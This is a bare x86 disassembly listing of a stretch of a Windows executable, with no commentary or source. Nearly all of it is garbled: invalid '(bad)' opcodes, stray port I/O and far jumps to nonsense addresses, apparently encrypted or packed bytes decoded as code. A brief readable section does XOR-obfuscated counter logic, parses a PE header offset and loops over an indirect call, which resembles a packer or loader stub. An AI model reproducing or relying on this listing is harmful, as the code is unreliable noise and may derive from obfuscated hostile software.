  40bd4f:	or     cl,BYTE PTR [eax-0x2b7a041c]
  40bd55:	mov    ebp,0x36232e34
  40bd5a:	dec    edx
  40bd5b:	nop
  40bd5c:	pop    ebp
  40bd5d:	mov    dh,0xd9
  40bd5f:	ja     0x40bce7
  40bd61:	shl    BYTE PTR [edi+ecx*4],1
  40bd64:	icebp  
  40bd65:	xor    al,ah
  40bd67:	ret    
  40bd68:	mov    esp,0x3b792f93
  40bd6d:	mov    al,ds:0x10771e09
  40bd72:	iret   
  40bd73:	adc    BYTE PTR [ebx-0x59],dl
  40bd76:	or     cl,cl
  40bd78:	cmp    edi,DWORD PTR [edi-0x36]
  40bd7b:	(bad)  
  40bd7c:	mov    eax,ds:0x8c501374
  40bd81:	xor    ch,dl
  40bd83:	xor    ch,BYTE PTR [edx]
  40bd85:	dec    edi
  40bd86:	mov    edi,0x544f3f31
  40bd8b:	fld    QWORD PTR [esi-0x910a19]
  40bd91:	arpl   WORD PTR [edi+edi*1],cx
  40bd94:	dec    ecx
  40bd95:	xchg   ecx,eax
  40bd96:	lea    ebx,[esi-0x5732775f]
  40bd9c:	mov    cl,0xf2
  40bd9e:	std    
  40bd9f:	pop    ebx
  40bda0:	adc    dl,ah
  40bda2:	(bad)  
  40bda3:	rcr    edi,1
  40bda5:	sub    dh,BYTE PTR [ebp+0x41]
  40bda8:	jl     0x40bdb9
  40bdaa:	enter  0xb9f,0xb9
  40bdae:	stc    
  40bdaf:	xchg   DWORD PTR [ebp*4+0x3d9032e0],ebx
  40bdb6:	out    0xa4,eax
  40bdb8:	test   eax,0xde416c22
  40bdbd:	test   DWORD PTR [ebx],0xacc4e71a
  40bdc3:	ins    DWORD PTR es:[edi],dx
  40bdc4:	rcr    DWORD PTR [edi-0x79],0x6f
  40bdc8:	xor    al,0x3f
  40bdca:	out    0x4e,eax
  40bdcc:	or     DWORD PTR [esi-0x50],ebp
  40bdcf:	pop    ss
  40bdd0:	dec    ebp
  40bdd1:	dec    esp
  40bdd2:	and    al,0x32
  40bdd4:	mov    al,ds:0x8c774c75
  40bdd9:	pop    es
  40bdda:	dec    ebx
  40bddb:	mov    edi,0x40491815
  40bde0:	jge    0x40be0f
  40bde2:	pop    eax
  40bde3:	sbb    DWORD PTR [esp-0x7856494a],0x9b190aa0
  40bdee:	push   ecx
  40bdef:	inc    ebx
  40bdf0:	mov    al,ds:0x861b783
  40bdf5:	inc    esp
  40bdf6:	repz call 0x32297719
  40bdfc:	aam    0xf1
  40bdfe:	lods   eax,DWORD PTR ds:[esi]
  40bdff:	lds    edx,FWORD PTR [esi+ecx*8+0x224ec67e]
  40be06:	leave  
  40be07:	rol    DWORD PTR [edx-0x7a],cl
  40be0a:	inc    ecx
  40be0b:	add    BYTE PTR [ebp+esi*8-0x5e73158a],cl
  40be12:	ret    
  40be13:	and    bh,BYTE PTR [ecx]
  40be15:	jae    0x40be2f
  40be17:	mov    ah,0x99
  40be19:	cli    
  40be1a:	cld    
  40be1b:	jg     0x40be03
  40be1d:	push   eax
  40be1e:	es (bad) 
  40be20:	aaa    
  40be21:	pushf  
  40be22:	push   esi
  40be23:	sub    WORD PTR [edx-0x22],bx
  40be27:	call   0xb4188756
  40be2c:	rcr    ah,1
  40be2e:	retf   
  40be2f:	push   es
  40be30:	mov    esi,0x2441498c
  40be35:	or     eax,0x25d98cb0
  40be3a:	pop    edi
  40be3b:	xor    ebp,ecx
  40be3d:	in     eax,dx
  40be3e:	add    BYTE PTR gs:[edi+edi*1],0x42
  40be43:	fld    DWORD PTR [edx+eax*2]
  40be46:	pop    edi
  40be47:	adc    eax,ebp
  40be49:	mov    dl,bl
  40be4b:	mov    al,BYTE PTR [eax]
  40be4d:	add    al,0x37
  40be4f:	and    DWORD PTR ds:0x432dde,0x432700
  40be59:	xor    al,0x47
  40be5b:	cmp    al,0xc3
  40be5d:	mov    DWORD PTR ds:0x432dd6,0x1383
  40be67:	jne    0x40c344
  40be6d:	mov    eax,DWORD PTR [ebp+0x8]
  40be70:	mov    ecx,DWORD PTR [ebp+0x8]
  40be73:	movzx  edx,BYTE PTR ds:0x434421
  40be7a:	xor    edx,DWORD PTR ds:0x434419
  40be80:	mov    DWORD PTR ds:0x434421,edx
  40be86:	add    ecx,DWORD PTR [eax+0x3c]
  40be89:	xor    eax,edx
  40be8b:	mov    edx,0x7510855
  40be90:	mov    DWORD PTR [ebp+0x8],ecx
  40be93:	or     ecx,0x72e5
  40be99:	mov    eax,DWORD PTR [ebp-0x4]
  40be9c:	and    DWORD PTR ds:0x434421,0x0
  40bea6:	mov    ecx,DWORD PTR ds:0x434421
  40beac:	inc    ecx
  40bead:	mov    DWORD PTR ds:0x434421,ecx
  40beb3:	cmp    DWORD PTR ds:0x434421,0x25
  40beba:	jne    0x40bed6
  40bec0:	push   0x432849
  40bec5:	push   DWORD PTR [ebp-0x24]
  40bec8:	push   0x7ea1
  40becd:	push   DWORD PTR [ebp-0x24]
  40bed0:	call   DWORD PTR ds:0x432d1a
  40bed6:	cmp    DWORD PTR ds:0x434421,0x17
  40bedd:	jb     0x40bea6
  40bee3:	xor    eax,edx
  40bee5:	push   esi
  40bee6:	jmp    0x40c101
  40beeb:	je     0x40befe
  40beed:	test   DWORD PTR [ebp+eiz*2+0x4df17194],eax
  40bef4:	pop    eax
  40bef5:	pop    esp
  40bef6:	or     dl,BYTE PTR [eax]
  40bef8:	push   ss
  40bef9:	les    ebx,FWORD PTR [ecx]
  40befb:	jnp    0x40bef9
  40befd:	jo     0x40bf6f
  40beff:	jb     0x40bf80
  40bf01:	jo     0x40bf73
  40bf03:	xor    BYTE PTR [esi],ch
  40bf05:	repz push eax
  40bf07:	adc    al,0xba
  40bf09:	loope  0x40bed9
  40bf0b:	fbld   TBYTE PTR [esi+0x1cc25284]
  40bf11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf12:	add    edx,DWORD PTR [ebx+0x77d391e2]
  40bf18:	jge    0x40bf1a
  40bf1a:	enter  0x868d,0x89
  40bf1e:	sbb    BYTE PTR [esi],0x3c
  40bf21:	addr16 int3 
  40bf23:	test   DWORD PTR [ecx],edx
  40bf25:	mov    edi,0x95d1bfbf
  40bf2a:	inc    ebp
  40bf2b:	sub    edx,DWORD PTR [ebp-0x1bdb759a]
  40bf31:	sbb    ebx,DWORD PTR [eax+0x7a]
  40bf34:	imul   esp,ebx,0x179cd607
  40bf3a:	jp     0x40bf36
  40bf3c:	mov    esi,0x816ff0be
  40bf41:	(bad)  
  40bf42:	sar    BYTE PTR [ebx-0x1d],cl
  40bf45:	and    bl,al
  40bf47:	cmp    ebx,DWORD PTR [ecx]
  40bf49:	mov    ebx,0x4da5e198
  40bf4e:	lock (bad) 
  40bf50:	mov    al,ds:0xdac8a0b3
  40bf55:	and    BYTE PTR ds:0x255a23b4,al
  40bf5b:	xchg   esp,eax
  40bf5c:	pop    es
  40bf5d:	inc    edi
  40bf5e:	lahf   
  40bf5f:	repz das 
  40bf61:	push   edx
  40bf62:	test   eax,0x79ea77b0
  40bf67:	sbb    bh,BYTE PTR [edi-0x15faba98]
  40bf6d:	ds cli 
  40bf6f:	sub    DWORD PTR [esi-0x44ae9210],ecx
  40bf75:	cmp    eax,0xa0920cc2
  40bf7a:	push   ecx
  40bf7b:	mov    ds:0x48023656,al
  40bf80:	xor    DWORD PTR [edi-0x5f],esi
  40bf83:	je     0x40bf70
  40bf85:	std    
  40bf86:	dec    edi
  40bf87:	aaa    
  40bf88:	lods   eax,DWORD PTR ds:[esi]
  40bf89:	sti    
  40bf8a:	in     eax,0x49
  40bf8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf8d:	aam    0x21
  40bf8f:	div    BYTE PTR [edi+0x7d09e56b]
  40bf95:	std    
  40bf96:	test   DWORD PTR [ebx+0x5c],ecx
  40bf99:	stc    
  40bf9a:	and    al,0xa1
  40bf9c:	inc    edi
  40bf9d:	ins    BYTE PTR es:[edi],dx
  40bf9e:	test   al,0x2e
  40bfa0:	addr16 xchg ecx,eax
  40bfa2:	nop
  40bfa3:	ret    
  40bfa4:	popa   
  40bfa5:	outs   dx,DWORD PTR ds:[esi]
  40bfa6:	mov    ebx,DWORD PTR [edx-0x38]
  40bfa9:	popf   
  40bfaa:	dec    edx
  40bfab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfac:	loope  0x40c020
  40bfae:	test   al,0x87
  40bfb0:	inc    ebp
  40bfb1:	pop    edx
  40bfb2:	retf   0xaf58
  40bfb5:	mov    esp,0x818400b8
  40bfba:	rol    DWORD PTR [ebx+0x19dd5f84],0x7
  40bfc1:	hlt    
  40bfc2:	out    dx,eax
  40bfc3:	and    eax,0x2c4f2f5a
  40bfc8:	cmp    al,0xe9
  40bfca:	push   ebp
  40bfcb:	stc    
  40bfcc:	shr    bl,cl
  40bfce:	popf   
  40bfcf:	call   0xa367:0x77a60172
  40bfd6:	lahf   
  40bfd7:	mov    edx,0x47dd84a8
  40bfdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfdd:	lods   al,BYTE PTR ds:[esi]
  40bfde:	out    dx,al
  40bfdf:	shr    DWORD PTR [eax-0x1c],0x4f
  40bfe3:	xchg   ebp,eax
  40bfe4:	jnp    0x40bfcf
  40bfe6:	jp     0x40bf9c
  40bfe8:	loope  0x40bfe6
  40bfea:	inc    esp
  40bfeb:	dec    ebx
  40bfec:	jnp    0x40c051
  40bfee:	or     bh,bl
  40bff0:	jmp    0xecda2e24
  40bff5:	sti    
  40bff6:	xor    ecx,DWORD PTR [esi-0x6f]
  40bff9:	pop    esp
  40bffa:	(bad)  
  40bffb:	mov    ch,0x66
  40bffd:	dec    edx
  40bffe:	pop    ebx
  40bfff:	push   0x6f856747
  40c004:	test   eax,esp
  40c006:	jp     0x40c063
  40c008:	into   
  40c009:	aas    
  40c00a:	or     dh,BYTE PTR [eax]
  40c00c:	out    dx,al
  40c00d:	lea    ebp,[ecx-0x13]
  40c010:	(bad)  
  40c011:	jge    0x40c025
  40c013:	inc    ebp
  40c014:	mov    ds:0x590aeb0a,eax
  40c019:	mov    sp,0xabb
  40c01d:	xor    eax,0xd9569cc1
  40c022:	xchg   ebx,eax
  40c023:	mov    ebp,0x626b63f5
  40c028:	dec    edi
  40c029:	xchg   edx,eax
  40c02a:	sbb    DWORD PTR [esi+0x56678a08],ebp
  40c030:	xor    al,0xc5
  40c032:	sahf   
  40c033:	jmp    0x40c094
  40c035:	fnstsw WORD PTR [edi+0x78]
  40c038:	outs   dx,DWORD PTR ds:[esi]
  40c039:	cdq    
  40c03a:	pop    esi
  40c03b:	aas    
  40c03c:	sbb    BYTE PTR [ebp+0x345c8de9],0x48
  40c043:	jp     0x40c03a
  40c045:	mov    eax,0xdc922eec
  40c04a:	xor    eax,0x9a1251f
  40c04f:	mov    ebp,gs
  40c051:	shl    DWORD PTR [eax+edi*4],cl
  40c054:	imul   eax,DWORD PTR [ebx],0x148338a6
  40c05a:	mov    bh,al
  40c05c:	pop    es
  40c05d:	xor    esi,DWORD PTR [ebp+0x43]
  40c060:	out    dx,eax
  40c061:	push   cs
  40c062:	sub    al,0x77
  40c064:	scas   eax,DWORD PTR es:[edi]
  40c065:	mov    esp,0x29dfcb82
  40c06a:	adc    ch,BYTE PTR [eax]
  40c06c:	xor    cl,BYTE PTR [ebx+0x55]
  40c06f:	inc    edi
  40c070:	push   ds
  40c071:	dec    edx
  40c072:	sub    DWORD PTR [ecx-0x6a],esi
  40c075:	(bad)  
  40c076:	rcl    esi,1
  40c078:	cli    
  40c079:	xchg   esp,eax
  40c07a:	lds    ecx,FWORD PTR [ebx+0x1c]
  40c07d:	push   ss
  40c07e:	inc    ebx
  40c07f:	sub    al,0xc
  40c081:	call   edx
  40c083:	cmp    BYTE PTR [ebp-0x6a43e612],ah
  40c089:	rcr    BYTE PTR [eax-0x1181e4ac],1
  40c08f:	repz lahf 
  40c091:	xchg   DWORD PTR [edi-0x1a],ebx
  40c094:	push   edx
  40c095:	adc    bl,BYTE PTR [ebx+edi*1+0x5cf06de2]
  40c09c:	in     eax,0x41
  40c09e:	pop    esi
  40c09f:	popa   
  40c0a0:	jo     0x40c078
  40c0a2:	scas   al,BYTE PTR es:[edi]
  40c0a3:	retf   0x8fc7
  40c0a6:	icebp  
  40c0a7:	and    bh,0xd9
  40c0aa:	mov    dl,0x2e
  40c0ac:	shl    BYTE PTR [edx+0x20],1
  40c0af:	test   DWORD PTR [ebx-0x4aa46fa3],ebx
  40c0b5:	xchg   edi,eax
  40c0b6:	mov    DWORD PTR [ecx+0x73a874e7],edx
  40c0bc:	cli    
  40c0bd:	adc    ebx,eax
  40c0bf:	les    esi,FWORD PTR [ecx+0x2f]
  40c0c2:	sub    bl,dl
  40c0c4:	daa    
  40c0c5:	add    al,0x7d
  40c0c7:	sub    dl,BYTE PTR [ebx]
  40c0c9:	jecxz  0x40c0e9
  40c0cb:	ret    
  40c0cc:	pop    edi
  40c0cd:	jge    0x40c11d
  40c0cf:	xchg   esi,eax
  40c0d0:	(bad)  
  40c0d2:	les    edx,FWORD PTR [ebp+0x86c8d88]
  40c0d8:	das    
  40c0d9:	scas   al,BYTE PTR es:[edi]
  40c0da:	ins    DWORD PTR es:[edi],dx
  40c0db:	dec    ebx
  40c0dc:	push   0x66
  40c0de:	loopne 0x40c125
  40c0e0:	add    edi,DWORD PTR [esi+0x74f736bb]
  40c0e6:	outs   dx,DWORD PTR ds:[esi]
  40c0e7:	sahf   
  40c0e8:	ins    BYTE PTR es:[edi],dx
  40c0e9:	sbb    al,0x7e
  40c0eb:	adc    dl,al
  40c0ed:	push   ss
  40c0ee:	in     al,dx
  40c0ef:	add    BYTE PTR [ecx],dl
  40c0f1:	and    esi,DWORD PTR [ebx-0x64dae904]
  40c0f7:	outs   dx,BYTE PTR ds:[esi]
  40c0f8:	fs ins DWORD PTR es:[edi],dx
  40c0fa:	mov    ds:0xd6548a2d,al
  40c0ff:	in     eax,dx
  40c100:	call   0xb9493690
  40c105:	pushf  
  40c106:	jb     0x40c13a
  40c108:	add    BYTE PTR [ebx],al
  40c10a:	shr    ecx,0x16
  40c10d:	add    al,BYTE PTR [eax]
  40c10f:	add    dl,bh
  40c111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c112:	push   ds
  40c113:	in     eax,0x21
  40c115:	gs inc ecx
  40c117:	arpl   WORD PTR [ebp*1+0x42a53b5],si
  40c11e:	jb     0x40c17b
  40c120:	jge    0x40c11c
  40c122:	jo     0x40c194
  40c124:	jb     0x40c1a5
  40c126:	jo     0x40c198
  40c128:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c129:	fnstcw WORD PTR [edx-0x5c96049b]
  40c12f:	inc    edi
  40c130:	nop
  40c131:	xchg   DWORD PTR [eax-0x2c],ecx
  40c134:	sub    eax,0x3f131496
  40c139:	jne    0x40c18d
  40c13b:	cmp    eax,0xa320397
  40c140:	lods   eax,DWORD PTR ds:[esi]
  40c141:	xchg   esp,eax
  40c142:	and    eax,0xe697a1f8
  40c147:	(bad)  
  40c148:	push   ebp
  40c149:	in     eax,dx
  40c14a:	mov    DWORD PTR [ecx],ebp
  40c14c:	sub    BYTE PTR [ecx+0x73],ch
  40c14f:	rcr    BYTE PTR [edi],1
  40c151:	rcl    DWORD PTR [ecx-0x2e],cl
  40c154:	arpl   WORD PTR [esi],sp
  40c156:	ins    DWORD PTR es:[edi],dx
  40c157:	adc    BYTE PTR [edi-0x7933d6eb],dl
  40c15d:	adc    eax,DWORD PTR [ecx]
  40c15f:	test   dl,ah
  40c161:	fiadd  DWORD PTR [ebp+0x6a4e57c2]
  40c167:	and    eax,0x2357c764
  40c16c:	push   0xffffffb2
  40c16e:	push   ebp
  40c16f:	(bad)  
  40c170:	loopne 0x40c164
  40c172:	inc    esi
  40c173:	sub    al,0xed
  40c175:	in     al,dx
  40c176:	pop    ebx
  40c177:	fimul  WORD PTR [edx+0x3dda4ece]
  40c17d:	cmp    al,0xdb
  40c17f:	dec    ecx
  40c180:	adc    DWORD PTR [eax],0xffffff8e
  40c183:	repnz (bad) 
  40c185:	fmul   QWORD PTR [esi+0xc76701d]
  40c18b:	dec    ebp
  40c18c:	popf   
  40c18d:	test   DWORD PTR [ebx+0x5cd8998],esp
  40c193:	cli    
  40c194:	rol    DWORD PTR [ebx],cl
  40c196:	sbb    esp,DWORD PTR [edi+edx*2]
  40c199:	cmp    bh,BYTE PTR [edx-0x7c146199]
  40c19f:	test   ebp,edx
  40c1a1:	xchg   ecx,eax
  40c1a2:	ins    BYTE PTR es:[edi],dx
  40c1a3:	not    DWORD PTR [ecx+edi*1-0x4a]
  40c1a7:	xchg   edx,eax
  40c1a8:	pop    ecx
  40c1a9:	outs   dx,DWORD PTR ds:[esi]
  40c1aa:	je     0x40c17e
  40c1ac:	fucomip st,st(5)
  40c1ae:	shl    eax,0xf7
  40c1b1:	mov    bl,0x9b
  40c1b3:	xor    eax,DWORD PTR [ebx]
  40c1b5:	pop    eax
  40c1b6:	icebp  
  40c1b7:	das    
  40c1b8:	mov    DWORD PTR [ebx],0xa1a7e561
  40c1be:	jg     0x40c1f4
  40c1c0:	jmp    0xf24c56ea
  40c1c5:	lds    edi,FWORD PTR [eax]
  40c1c7:	cdq    
  40c1c8:	xchg   ecx,eax
  40c1c9:	loop   0x40c1ea
  40c1cb:	mov    eax,0x4dfa3951
  40c1d0:	sub    edx,ebx
  40c1d2:	and    edi,DWORD PTR [esi-0x765162ad]
  40c1d8:	mov    ch,0x51
  40c1da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1db:	push   ds
  40c1dc:	mov    WORD PTR [esi],fs
  40c1de:	fstp   DWORD PTR [esi+0x2344b7de]
  40c1e4:	mov    edx,DWORD PTR [esi+0x70]
  40c1e7:	push   0x5a39166f
  40c1ec:	rcl    BYTE PTR [ebx],0xe2
  40c1ef:	aas    
  40c1f0:	jp     0x40c175
  40c1f2:	cdq    
  40c1f3:	cmp    DWORD PTR [esp+esi*2-0x740f6bf1],ebp
  40c1fa:	pop    ds
  40c1fb:	push   ebp
  40c1fc:	add    esp,DWORD PTR [ebx]
  40c1fe:	dec    eax
  40c1ff:	fist   WORD PTR [edx+0x4f]
  40c202:	jbe    0x40c18a
  40c204:	jae    0x40c20f
  40c206:	mov    ds:0xe988bd7c,eax
  40c20b:	sub    ebx,ebx
  40c20d:	cmp    DWORD PTR [edi+ebx*8],edi
  40c210:	loope  0x40c23d
  40c212:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c213:	xchg   ebp,eax
  40c214:	pop    ds
  40c215:	sbb    BYTE PTR [ecx+eiz*1],0xd
  40c219:	ins    DWORD PTR es:[edi],dx
  40c21a:	xor    cl,al
  40c21c:	adc    ebp,DWORD PTR [edx]
  40c21e:	mov    ecx,0xb58b467
  40c223:	add    BYTE PTR [edi-0x7b],dh
  40c226:	and    eax,0x2d01a56f
  40c22b:	and    eax,0x44ea4a98
  40c230:	and    eax,0xfe48ebaf
  40c235:	leave  
  40c236:	ins    BYTE PTR es:[edi],dx
  40c237:	loop   0x40c1ea
  40c239:	cmp    ah,BYTE PTR [eax]
  40c23b:	popf   
  40c23c:	and    DWORD PTR ds:0xf30023df,esp
  40c242:	shl    BYTE PTR [ebx-0x640af03c],0x7d
  40c249:	sbb    al,BYTE PTR [ecx]
  40c24b:	fmul   QWORD PTR [ebx+0x13f618dd]
  40c251:	or     al,0x4a
  40c253:	lock ffreep st(2)
  40c256:	into   
  40c257:	jno    0x40c2d0
  40c259:	ins    BYTE PTR es:[edi],dx
  40c25a:	test   BYTE PTR [ebx],ah
  40c25c:	cld    
  40c25d:	inc    esp
  40c25e:	jecxz  0x40c2c3
  40c260:	sbb    al,0x9
  40c262:	sar    DWORD PTR [esi],cl
  40c264:	push   edx
  40c265:	sbb    BYTE PTR [ebx+0xe],dl
  40c268:	scas   eax,DWORD PTR es:[edi]
  40c269:	imul   esp,DWORD PTR [eax+0x6d],0xe17fdfe1
  40c270:	adc    ecx,esp
  40c272:	add    BYTE PTR [ebx+0x7e],0x8a
  40c276:	lock shr DWORD PTR [ecx],0x7a
  40c27a:	fisttp DWORD PTR [ebx]
  40c27c:	imul   esi,DWORD PTR [edx-0x696c0588],0x199ba9dc
  40c286:	cmp    DWORD PTR [ebx],edx
  40c288:	mov    bh,0xce
  40c28a:	iret   
  40c28b:	pop    ecx
  40c28c:	mov    edx,0x2cbb0377
  40c291:	ins    DWORD PTR es:[edi],dx
  40c292:	mov    fs,WORD PTR [edi+0x34d5391a]
  40c298:	cmp    eax,DWORD PTR [edx+ecx*4]
  40c29b:	mov    eax,ds:0x6cdfe20
  40c2a0:	popa   
  40c2a1:	sub    eax,0x1885e04e
  40c2a6:	add    BYTE PTR [ecx],dl
  40c2a8:	push   eax
  40c2a9:	xchg   esp,eax
  40c2aa:	xor    ebx,DWORD PTR [eax+0x11]
  40c2ad:	aam    0xb
  40c2af:	ret    0xc7e4
  40c2b2:	shl    DWORD PTR [esi+0x61],0x56
  40c2b6:	xchg   esp,eax
  40c2b7:	adc    eax,0x90d34f5c
  40c2bc:	mov    ds:0x3d54eba9,al
  40c2c1:	or     eax,0x74577a0a
  40c2c6:	stos   BYTE PTR es:[edi],al
  40c2c7:	sbb    eax,DWORD PTR [eax]
  40c2c9:	add    BYTE PTR [esi+0xdbb17b3],al
  40c2cf:	sti    
  40c2d0:	gs imul edi,edx,0xa
  40c2d4:	shr    BYTE PTR [esi-0x19538064],0x56
  40c2db:	lods   eax,DWORD PTR ds:[esi]
  40c2dc:	jne    0x40c2c6
  40c2de:	fnstsw WORD PTR [edi]
  40c2e0:	outs   dx,BYTE PTR ds:[esi]
  40c2e1:	cmp    dl,bl
  40c2e3:	cdq    
  40c2e4:	out    dx,eax
  40c2e5:	stos   BYTE PTR es:[edi],al
  40c2e6:	std    
  40c2e7:	out    0x18,eax
  40c2e9:	test   DWORD PTR [esi],esp
  40c2eb:	jne    0x40c290
  40c2ed:	popa   
  40c2ee:	sub    dl,BYTE PTR [ebx+esi*2+0x73a80c25]
  40c2f5:	add    eax,0x512a8d66
  40c2fa:	ja     0x40c313
  40c2fc:	(bad)  
  40c2fe:	jns    0x40c324
  40c300:	fiadd  WORD PTR [ebp+0x685ec1]
  40c306:	lds    edi,FWORD PTR [ebp-0x3997af87]
  40c30c:	pop    eax
  40c30d:	sbb    ebx,DWORD PTR [ebx-0x33ca64cb]
  40c313:	out    dx,al
  40c314:	mov    cl,0x5f
  40c316:	retf   0xbbce
  40c319:	pop    ds
  40c31a:	add    al,0x96
  40c31c:	push   eax
  40c31d:	or     eax,0x895dbfa9
  40c322:	stos   BYTE PTR es:[edi],al
  40c323:	jne    0x40c37c
  40c325:	dec    ebx
  40c326:	cmp    DWORD PTR [esi+0x54],eax
  40c329:	pop    esi
  40c32a:	je     0x40c338
  40c330:	mov    eax,DWORD PTR [ebp+0x8]
  40c333:	jmp    0x40c787
  40c338:	mov    eax,DWORD PTR [ebp-0x4]
  40c33b:	xor    eax,edx
  40c33d:	add    eax,ecx
  40c33f:	jmp    0x40c787
  40c344:	mov    eax,DWORD PTR [ebp-0x4]
  40c347:	jmp    0x40c562
  40c34c:	or     eax,0x739e7462
  40c351:	scas   al,BYTE PTR es:[edi]
  40c352:	shl    DWORD PTR [ecx-0x41],1
  40c355:	jb     0x40c38a
  40c357:	loop   0x40c2ff
  40c359:	mov    DWORD PTR [ebp+0x70f87f1b],eax
  40c35f:	jo     0x40c3d3
  40c361:	jg     0x40c3d3
  40c363:	jo     0x40c3cd
  40c365:	jo     0x40c3cb
  40c367:	adc    dh,BYTE PTR ds:0x9b20d87d
  40c36d:	sbb    eax,edx
  40c36f:	je     0x40c399
  40c371:	in     al,0x76
  40c373:	cmp    dl,BYTE PTR [edi+esi*2+0x11559ed6]
  40c37a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c37b:	mov    es,WORD PTR [eax+0x33]
  40c37e:	jg     0x40c34e
  40c380:	pop    es
  40c381:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c382:	les    ebp,FWORD PTR [eax-0x32]
  40c385:	inc    ecx
  40c386:	ins    BYTE PTR es:[edi],dx
  40c387:	int3   
  40c388:	push   0x10
  40c38a:	mov    ?,WORD PTR [esi]
  40c38c:	cwde   
  40c38d:	cli    
  40c38e:	or     esi,DWORD PTR ds:0x9a52ecde
  40c394:	jne    0x40c332
  40c396:	xchg   bl,ah
  40c398:	cdq    
  40c399:	push   ss
  40c39a:	xor    eax,0xe3a9b7cd
  40c39f:	mov    ebx,0xc3dffd2f
  40c3a4:	stos   BYTE PTR es:[edi],al
  40c3a5:	fistp  DWORD PTR ds:0x7ff339ab
  40c3ab:	nop
  40c3ac:	add    al,0xc1
  40c3ae:	stc    
  40c3af:	iret   
  40c3b0:	xchg   ebx,eax
  40c3b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3b2:	pop    ebx
  40c3b3:	inc    esi
  40c3b4:	scas   eax,DWORD PTR es:[edi]
  40c3b5:	push   edi
  40c3b6:	stos   BYTE PTR es:[edi],al
  40c3b7:	push   esp
  40c3b8:	jns    0x40c410
  40c3ba:	sbb    BYTE PTR [ebp+0x20],ah
  40c3bd:	xor    eax,0x639bcb4e
  40c3c2:	in     al,dx
  40c3c3:	out    dx,eax
  40c3c4:	jmp    0xa7e6:0x4036e4b2
  40c3cb:	fmul   DWORD PTR [eax]
  40c3cd:	push   ebp
  40c3ce:	sbb    al,0xf9
  40c3d0:	mov    eax,ds:0xd552652f
  40c3d5:	popf   
  40c3d6:	les    ebp,FWORD PTR [edx+ebx*2-0x4a41386]
  40c3dd:	mov    DWORD PTR [ebx],ebx
  40c3df:	dec    edx
  40c3e0:	jae    0x40c45d
  40c3e2:	(bad)  
  40c3e3:	fld    TBYTE PTR [eax-0x4a]
  40c3e6:	les    esp,FWORD PTR [ebx+0x24a874bc]
  40c3ec:	(bad)  
  40c3ed:	ja     0x40c418
  40c3ef:	loope  0x40c3fe
  40c3f1:	jl     0x40c3a0
  40c3f3:	jnp    0x40c3f9
  40c3f5:	mov    dl,0x10
  40c3f7:	(bad)  
  40c3f8:	enter  0xec71,0x64
  40c3fc:	adc    DWORD PTR [edi+0x38237b94],edi
  40c402:	push   0xffffff81
  40c404:	lea    edi,[edi]
  40c406:	pop    esp
  40c407:	mov    dl,0x70
  40c409:	fwait
  40c40a:	push   edx
  40c40b:	aaa    
  40c40c:	dec    ecx
  40c40d:	dec    eax
  40c40e:	inc    ebp
  40c40f:	int    0x74
  40c411:	ret    0xa19b
  40c414:	cmp    ecx,edi
  40c416:	jle    0x40c3da
  40c418:	sub    dl,bh
  40c41a:	(bad)  
  40c41b:	jno    0x40c3ff
  40c41d:	bound  ebp,QWORD PTR [ebx]
  40c41f:	adc    esi,esi
  40c421:	lea    ebx,[edi-0x45885927]
  40c427:	jp     0x40c3ed
  40c429:	push   ebx
  40c42a:	xchg   ebp,eax
  40c42b:	mov    DWORD PTR [esi-0x3a],esi
  40c42e:	jge    0x40c3ff
  40c430:	xchg   edx,eax
  40c431:	sbb    BYTE PTR [edx],ch
  40c433:	dec    esp
  40c434:	xchg   DWORD PTR [ecx],esi
  40c436:	mov    cl,0xbd
  40c438:	stos   DWORD PTR es:[edi],eax
  40c439:	dec    eax
  40c43a:	xlat   BYTE PTR ds:[ebx]
  40c43b:	or     edx,DWORD PTR [eax+0x1caa6165]
  40c441:	inc    ecx
  40c442:	test   eax,0xc006c24b
  40c447:	dec    eax
  40c448:	sbb    DWORD PTR [ebx],ebx
  40c44a:	dec    ebp
  40c44b:	sub    esi,DWORD PTR [esi-0x616e7b87]
  40c451:	enter  0x569f,0xd
  40c455:	fld    DWORD PTR [ecx-0x2b8fe19c]
  40c45b:	stos   DWORD PTR es:[edi],eax
  40c45c:	sti    
  40c45d:	aad    0x2d
  40c45f:	div    DWORD PTR [ebx+0x629fdd1c]
  40c465:	push   ebp
  40c466:	(bad)  
  40c468:	int3   
  40c469:	dec    ebp
  40c46a:	push   edx
  40c46b:	clc    
  40c46c:	call   0x98a8:0x2bd571ba
  40c473:	ins    DWORD PTR es:[edi],dx
  40c474:	(bad)  
  40c475:	fwait
  40c476:	inc    ecx
  40c477:	fnstcw WORD PTR [edi+0x157d7f42]
  40c47d:	(bad)  
  40c47e:	stc    
  40c47f:	dec    ebp
  40c480:	jmp    0x32a752b7
  40c485:	cmp    ah,BYTE PTR [edi+0x64]
  40c488:	xor    DWORD PTR [edi+eiz*2+0x54],eax
  40c48c:	fisubr WORD PTR [eax-0x23]
  40c48f:	xchg   ecx,eax
  40c490:	outs   dx,DWORD PTR ds:[esi]
  40c491:	inc    ebx
  40c492:	push   esi
  40c493:	pop    eax
  40c494:	xor    cl,bh
  40c496:	mov    cl,bl
  40c498:	fild   QWORD PTR [edi-0x6d532e70]
  40c49e:	stc    
  40c49f:	inc    esp
  40c4a0:	mov    BYTE PTR [edi-0x53],dh
  40c4a3:	xchg   ebx,eax
  40c4a4:	icebp  
  40c4a5:	and    DWORD PTR [esi-0x48],esi
  40c4a8:	push   ds
  40c4a9:	jg     0x40c4a7
  40c4ab:	call   0xa0a7:0x2a5c655d
  40c4b2:	or     DWORD PTR [eax-0x5f763c4d],esi
  40c4b8:	imul   BYTE PTR [edi]
  40c4ba:	push   0xef9a50f3
  40c4bf:	imul   edi,DWORD PTR [edi-0x81c4090],0xffffffc1
  40c4c6:	clc    
  40c4c7:	popa   
  40c4c8:	popa   
  40c4c9:	mov    bl,0x7b
  40c4cb:	push   edi
  40c4cc:	int    0xb0
  40c4ce:	pop    eax
